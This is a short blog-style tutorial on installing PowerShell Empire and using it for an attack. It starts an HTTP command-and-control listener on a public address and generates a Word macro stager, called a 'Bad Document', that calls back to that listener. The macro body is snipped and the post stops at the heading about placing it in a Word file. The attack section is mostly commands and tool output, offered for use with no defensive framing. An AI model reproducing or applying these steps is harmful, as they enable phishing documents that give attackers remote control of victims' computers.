---
title: Powershell Empire 
date: 2021-04-02T18:47:08+05:30
lastmod: 2021-04-02T18:47:08+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
cover: /img/cover.jpg
categories:
  - installation
  - Hacking
tags:
  - Empire

---

# Prereq

## install pip3 (python Package installer)

```bash
sudo apt install python3-pip -y 
```

## Install Poetry 
```
sudo pip3 install poetry
```

## install Git 

```bash 
sudo apt install git -y 
```

## Install Powershell - Empire
```bash 
git clone --recursive https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh
sudo poetry install
sudo poetry run python empire
```

---
# Hacking 

## generate a listener (http)

```bash 
(Empire) > uselistener http
(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  Name              True        http                             Name for the listener.
  Host              True        http://10.128.0.15               Hostname/IP for staging.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  Port              True                                         Port for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  [snip]
  ```

change the IP & port 

```bash 
(Empire: listeners/http) > set Host 34.xx.xx.xx
(Empire: listeners/http) > set Port 9001
```
finally execute to start listening 
```bash 
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
```

## Payload (Macro for Bad Document)

```bash 
(Empire) > usestager windows/macro
(Empire: stager/windows/macro) > info

Name: Macro
...[snip]...

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  Language         True        powershell        Language of the stager to generate.
  StagerRetries    False       0                 Times for the stager to retry
                                                 connecting.
  OutFile          False                         File to output launcher to, otherwise
                                                 displayed on the screen

... [snip]  ...                                            
```

set the listener value here

``` 
(Empire: stager/windows/macro) > set Listener http
(Empire: stager/windows/macro) > execute
Sub AutoClose()
	db
End Sub

Public Function db() As Variant
[snip]
```


## Put Macro in Word File. 